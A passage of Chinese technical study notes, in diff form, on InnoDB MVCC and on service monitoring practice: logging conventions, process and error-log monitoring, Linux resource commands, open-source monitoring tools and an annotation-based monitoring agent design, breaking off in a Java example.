+<p>MVCC的实现，是通过保存数据在某个时间点的快照来实现的。也就是说，不管需要执行多长时间，每个事务看到的数据都是一致的。根据事务开始的时间不通，每个事务对同一张表，同一时刻看到的数据可能是不一样的。</p>
+<p>InnoDB的MVCC，是通过在每行记录后面保存两个隐藏的列来实现的。这两个列，一列保存行的创建时间，一列保存行的过期时间（删除时间）。存储的并不是真实的时间值，而是系统版本号。每开始一个新的事务，系统版本号会自动递增。事务开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行的版本号进行比较。在Repeatable
+Read隔离级别下，针对具体的操作：</p>
+<p><strong>SELECT</strong></p>
+<p>只有符合下面两个条件的记录才会被返回</p>
+<p>①InnoDB只查找版本早于当前事务版本的数据行（行的版本号小于或等于事务的系统版本号），这可以确保读取到的行要么是在事务开始前就已经存在，要么是事物自身掺入或修改过的</p>
+<p>②行的删除版本号要么未定义，要么大于当前事务的版本号。这可以确保事务读取到的行，在事务开始之前未被删除。</p>
+<p><strong>INSERT</strong></p>
+<p>InnoDB为新插入的每一行保存当前系统版本号作为行版本号。</p>
+<p><strong>DELETE</strong></p>
+<p>InnoDB为删除的每一行保存当前系统版本号作为删除版本号。</p>
+<p><strong>UPDATE</strong></p>
+<p>InnoDB插入一条新记录，其行版本号为当前系统版本号，同时系统版本号更新到原始行的删除版本号中。</p>
+<p>MVCC只在Repeatable Read，Read
+Committed两个隔离级别下工作。其它两个隔离级别都和MVCC不兼容，因为Read
+Uncommitted总是读取最新的数据行，而不是符合当前事务版本的数据行。而Serializble则会对所有读取的行都加锁。</p>
+<h2><a class="anchor" aria-hidden="true" id="sharding-jdbc"></a><a href="#sharding-jdbc" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Sharding-JDBC</h2>
+<h2><a class="anchor" aria-hidden="true" id="mysql"></a><a href="#mysql" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>MySQL</h2>
+<h3><a class="anchor" aria-hidden="true" id="gtid"></a><a href="#gtid" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>GTID</h3>
+<h2><a class="anchor" aria-hidden="true" id="titan"></a><a href="#titan" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Titan</h2>
+<h2><a class="anchor" aria-hidden="true" id="pika"></a><a href="#pika" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Pika</h2>
+<h2><a class="anchor" aria-hidden="true" id="fastdfs"></a><a href="#fastdfs" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Fastdfs</h2>
+<h2><a class="anchor" aria-hidden="true" id="elasticsearch"></a><a href="#elasticsearch" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Elasticsearch</h2>
+<h2><a class="anchor" aria-hidden="true" id="google-guava-cache"></a><a href="#google-guava-cache" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Google Guava Cache</h2>
+<h1><a class="anchor" aria-hidden="true" id="智能互联网之服务治理篇"></a><a href="#智能互联网之服务治理篇" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>智能互联网之服务治理篇</h1>
+<p><strong>监控的重要性：</strong>进程监控 --&gt; 及时发现问题 --&gt; 主动权</p>
+<p><strong>监控的目的：</strong>防患于未然，在服务出现问题或者快要出现问题时能够准确快速地发现以减小影响范围</p>
+<p><strong>哪些需要监控：</strong>主要包括进程运行状态和机器资源状态。实际凡是有可能出现问题的地方都需要监控，而且这是一个&quot;出现问题--添加监控--举一反三&quot;的过程。功能上线前需思考：该功能的哪些地方可能会出现问题，需要添加监控（可在方案评估的时候进行监控的评估）</p>
+<p>下面是常规的一些场景：</p>
+<p>1、硬件：cpu、磁盘、内存</p>
+<p>2、进程：是否存在或僵死</p>
+<p>3、依赖外部服务：外服服务是否有问题，可以通过有效性探测或SQL监控调用记录来发现</p>
+<p>4、依赖外部数据：文件同步可监控文件是否已同步、文件条数是否正确；表同步可监控是否已同步，同步条数</p>
+<p>5、定时任务：定时任务是否已加载（已有），是否执行，是否执行异常</p>
+<p>6、数据积压：定时任务待处理数据是否积压</p>
+<p>7、提供给外部的数据：文件或表是否已生成，记录数量是否正确</p>
+<p><strong>监控告警配置注意事项：</strong></p>
+<p>1、合理定义告警级别：不对的高级级别对应不同的处理方式。影响范围大的或需要紧急处理的，需要配置高级别</p>
+<p>2、监控频率：多久监控一次</p>
+<p>3、详细的告警内容：告警内容尽量详细，最好包含处理建议，因为时间久之后，告警就不知道怎么处理。</p>
+<p>告警的推送可以采用企业微信。（短信差不多1条3分钱）</p>
+<h2><a class="anchor" aria-hidden="true" id="服务治理数据采集方法"></a><a href="#服务治理数据采集方法" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>服务治理数据采集方法</h2>
+<p>1、用户请求日志：日志打印，需要定义日志规范，这里主要是指日志具有统一的格式。</p>
+<p>可采用下面的格式：</p>
+<p>channel=($xiangdanchaxun$),billId=($15700000000$),startTime=($20131223003959$),clientId=($$),entityName=($$),isSucc=($1$),opId=($null$),costTime=($275$),dataSoureName=($ocnosqlDataSource$),queryDSElapsedTime=($63$),totalCount=($546$),totalQueryCount=($3339$),clientIp=($10.10.10.10$),busiType=($NEW_GSM$),billMonth=($201311$),fromDate=($20131101$),thruDate=($20131130$),startIndex=($1$),stopIndex=($20$),isFromCache=($false$),isBackup=($false$),reason=($null$),organizationId=($null$)</p>
+<p>2、服务端数据上报：采集业务数据上报和立体监控</p>
+<p>3、前端页面行为：通过数据埋点进行客户端上报</p>
+<p><strong>常规日志打印规范：</strong></p>
+<p>1、﻿日志API，﻿应用中不可直接使用日志系统(Log4j、Logback)中的
+API，﻿而应依赖使用日志框架SLF4J中的API，﻿使用门面模式的日志框架，有利于维护和各个类的日志处理方式统一</p>
+<p><em>﻿import org.slf4j.Logger;</em></p>
+<p><em>import org.slf4j.LoggerFactory;</em></p>
+<p><em>private static final Logger logger =
+LoggerFactory.getLogger(Abc.class);</em></p>
+<p>2、﻿调用外部重要服务的地方最好打个日志，方便追踪到调用系统返回值是否是正确的</p>
+<p>3、﻿异常信息应该包括两类信息：案发现场信息和异常堆栈信息。不使用<em>logger.error(e.getMessage())</em>，<em>e.printStackTrace</em>，采用<em>logger.error(&quot;异常&quot;,
+e)</em></p>
+<p>4、﻿打印日志一定要注意日志的输出量，如果频繁调用的方法，在不影响后面分析错误原因的情况下尽量少打</p>
+<p>5、﻿在方法中打日志尽量要克制，特别是可能频繁输出的日志，冗余日志太多影响性能，影响问题定位，且容易造成日志文件太大，﻿打印日志前需&quot;三思&quot;：﻿这些日志真的有人看吗？﻿看到这条日志你能做什么？﻿能不能给问题排查带来好处？</p>
+<p>6、﻿异常情况日志更详细，日志最好包含上下文，这样可以省去不少定位时间</p>
+<p>7、﻿正确的区分日志的级别，﻿﻿debug、info、﻿warn、error</p>
+<p>8、不使用System.out.println输出日志</p>
+<h2><a class="anchor" aria-hidden="true" id="传统服务监控手段"></a><a href="#传统服务监控手段" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>传统服务监控手段</h2>
+<p>进程监控：进程是否还存在</p>
+<p>语义监控：进程的语义监控，判断进程是否还在正常工作</p>
+<p>错误日志监控：</p>
+<p>数据波动监控：流量的突增突降</p>
+<p>数据资源监控：机器资源</p>
+<h2><a class="anchor" aria-hidden="true" id="进程监控"></a><a href="#进程监控" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>进程监控</h2>
+<p>解决问题：进程是否存活</p>
+<p>解决方法：</p>
+<p>传统方法，ps --aux|grep
+process，不断轮训，没有输出结果，触发报警，存在轮训时间间隔的问题（太长不能及时发现问题，太短对主机资源消耗大）</p>
+<p>优雅方案：通过linux daemontools，supervise。</p>
+<p>Supervise是daemontools的一个工具，可以用来监控管理linux下的应用程序运行情况，在应用程序出现异常时，supervise可以重新启动指定程序。主要原理，父进程可以感知子进程的转态。</p>
+<p>wait和waitpid函数：1）wait()函数用于使父进程阻塞，直到一个子进程结束或者该进程接收到了一个指定的信号为止。如果该父进程没有子进程或者它的子进程已经结束，则wait()函数就会立即返回。2）waitpid()的作用和wait()一样，但它并不一定要等待第一个终止的子进程（它可以指定需要等待终止的子进程），它还有若干选项，如可提供一个非阻塞版本的
+wait()功能，也能支持作业控制。实际上，wait()函数只是
+waitpid()函数的一个特例，在Linux 内部实现
+wait()函数时直接调用的就是waitpid()函数。</p>
+<h2><a class="anchor" aria-hidden="true" id="语义监控"></a><a href="#语义监控" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>语义监控</h2>
+<p>解决问题：进程&quot;假死&quot;问题</p>
+<p>解决方案：模拟用户对服务接口发送请求，判断请求返回结果（成功、失败、超时）</p>
+<p>监控请求类型</p>
+<p>HTTP：返回码，200/4**/5**</p>
+<p>RPC：通过独立客户端进程，需自研，可以只监控关键接口</p>
+<p>非幂等请求监控：</p>
+<p>需要对比返回结果，顺序监控请求序列CRUD。</p>
+<p>如果针对所有的接口都进行监控，太繁琐且对应用有侵入，所有采用一种通用的监控方式：错误日志监控。</p>
+<h2><a class="anchor" aria-hidden="true" id="错误日志监控"></a><a href="#错误日志监控" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>错误日志监控</h2>
+<p>相对于语义监控是一种比较通用的监控方式。</p>
+<p>info级别的日志和error级别的日志分开打印到不同的文件。监控错误日志数据量是否暴涨。</p>
+<p>阈值：统计线上服务高峰期1分钟错误量，根据高峰期错误量设定报警阈值。</p>
+<p>需要基于日志实时统计：</p>
+<p>1、日志打印本地采集到Hadoop：Flume/Kafka</p>
+<p>2、日志计算分析：Spark/Storm/Flink</p>
+<p>3、计算结果存储：Redis/MySQL</p>
+<p>4、定时拉取比对进程：每一分钟拉取结果数据和设定阀值比较，超过即报警。</p>
+<h2><a class="anchor" aria-hidden="true" id="数据波动监控"></a><a href="#数据波动监控" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>数据波动监控</h2>
+<p>第一时间发现流量异常。流量上升：竞争对手抓取？流量下降：服务入口问题？流量可以采用info级别日志量。</p>
+<p>即时流量的对比：天级环比，周期同比。</p>
+<p>基于实时日志分析：日志采集 -&gt; 日志缓存 -&gt; 日志计算 -&gt; 结果存储 -&gt;
+结果查询 -&gt; 数据结果同比/环比制定 -&gt; 报警</p>
+<h2><a class="anchor" aria-hidden="true" id="机器资源监控"></a><a href="#机器资源监控" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>机器资源监控</h2>
+<p>及时发现机器资源的不足：内存、CPU、磁盘、网络</p>
+<p>Linux下如何监控：磁盘df --h，内存free --g，cpu vmstat，网络ifstat</p>
+<h2><a class="anchor" aria-hidden="true" id="优秀开源监控框架"></a><a href="#优秀开源监控框架" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优秀开源监控框架</h2>
+<p><strong>Zabbix</strong></p>
+<p>基于WEB界面的提供分布式系统监视一级网络监视功能的企业级的开源解决方案</p>
+<p>监控CPU、内存、磁盘、网络、端口、日志等功能</p>
+<p><strong>Open-Falcon</strong></p>
+<p>是一款企业级、高可用、可扩展的开源监控解决方案，由小米运维团队开源</p>
+<p>支持系统基础监控，第三方服务监控，JVM监控，业务应用监控</p>
+<p><strong>Prometheus + Grafana</strong></p>
+<p>Prometheus是一个开源的服务监控系统个，它通过HTTP协议从远程的机器收起数据并存储在本地的时序数据库上</p>
+<p>Grafana是一个开箱即用的可视化工具，具有功能齐全的度量仪表盘和图形编辑器，有灵活丰富的图形化选项，可以混合多种风格，支持多个数据源特点。</p>
+<p><strong>推荐使用Open-Falcon</strong></p>
+<h2><a class="anchor" aria-hidden="true" id="立体监控解决问题"></a><a href="#立体监控解决问题" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>立体监控解决问题</h2>
+<p>多视角监控</p>
+<p>用户视角：系统可用性、延时、内容完整</p>
+<p>系统视角：业务准确性、吞吐能力、系统健壮</p>
+<p>旁观者视角：波动、安全、链路、流量路径</p>
+<p>层次与纬度</p>
+<p>网关层：协议处理、流量处理（负载均衡、清洗、重写）</p>
+<p>业务逻辑层：依赖服务的时延、异常比例、某业务流程是否完整</p>
+<p>公共逻辑：账号状态检测，支付安全风险，搜索少无策略</p>
+<p>数据访问：消息吞吐量，存储慢查询比例，SQL注入风险</p>
+<p>基础设施：网卡流量，磁盘IO，CDN回源率，网络丢包率</p>
+<p>通用监控项（可采用Open-falcon监控）</p>
+<p>机器指标：CPU使用率、磁盘使用率、负载、内存使用率、网卡流量（IN/OUT）</p>
+<p>JVM指标：垃圾回收、内存变化、线程状态、CPU使用率</p>
+<p>进程指标：端口存活、进程个数、启动状态、占用FD</p>
+<p>DB指标：端口存活、链接可用性、SQL耗时、连接数、锁表、TPS、QPS、数据增量，表空间使用率</p>
+<p>业务监控（立体监控平台，传统监控无法理解业务，不满足业务级监控需求）</p>
+<p>如：发布次数、商品信息中包含非法字符个数、红包使用次数</p>
+<h2><a class="anchor" aria-hidden="true" id="立体监控设计与实践"></a><a href="#立体监控设计与实践" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>立体监控设计与实践</h2>
+<p>特点：业务隔离，原逻辑不用动；随时修改，即时生效；运行时不占用资源，零消耗</p>
+<p>目标：快速发现问题，辅助定位问题，可视化分析问题</p>
+<p>比如需求：监控商品发布接口每秒的调用次数，最大耗时，最小耗时，平均耗时</p>
+<p><strong>方式一：日志平台，</strong>定义统一的日志格式，然后通过Flume+Kafka收集日志并上传，通过Spark等开源工具进行计算。</p>
+<p>通过日志平台实现，需要上传的数据量大，计算量大。</p>
+<p><strong>方式二：立体监控平台</strong></p>
+<p><img src="media/image84.png" alt="">{width=&quot;2.5721325459317583in&quot;
+height=&quot;2.8146489501312337in&quot;}</p>
+<p>提供客户端jar包，以注解的方式插入监控项，数据写入到本地Agent，Agent按秒汇总，再发送给平台。</p>
+<p>监控项：定义的监控向，比如商品发布次数监控项，商品发布平均耗时监控项，登录平均耗时监控向等等，平台定义好监控项后，业务中映入。添加监控需要向平台申请监控项ID。</p>
+<p>服务器：服务器相关信息，落地的信息中通过服务器ID代替服务器相关信息。</p>
+<h3><a class="anchor" aria-hidden="true" id="设计要点"></a><a href="#设计要点" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>设计要点</h3>
+<p>一、应用服务和agent的通信</p>
+<p>1、共享内存：无协议通信开销，需要引入全局锁，操作共享内存时加锁。如果是c++程序可以选择，但java形式并不好。</p>
+<p>2、TCP方案：TCP是可靠方案，性能会有所影响</p>
+<p>3、UDP方案：效率高，因为是同主机，所以可靠性也很高</p>
+<p>二、agent发送数据：agent对数据进行按秒聚合，然后通过TCP发送到监控平台，进行统计分析。</p>
+<h3><a class="anchor" aria-hidden="true" id="业务接入"></a><a href="#业务接入" aria-hidden="true" class="hash-link"><svg class="hash-link-icon" aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>业务接入</h3>
+<p>一、硬编码</p>
+<hr>
+<p><strong>public</strong> String getUser() {<br>
+Monitor.<em>sum</em>(<strong><em>USER_COUNT</em></strong>, 1);<br>
+<strong>long</strong> begin = System.<em>currentTimeMillis</em>();<br>
+<strong>try</strong> {<br>
+System.<strong><em>out</em></strong>.println(<strong>&quot;执行业务逻辑&quot;</strong>);<br>
+} <strong>catch</strong> (Exception e) {<br>
+Monitor.<em>sum</em>(<strong><em>EXCEPTION_COUNT</em></strong>, 1);<br>
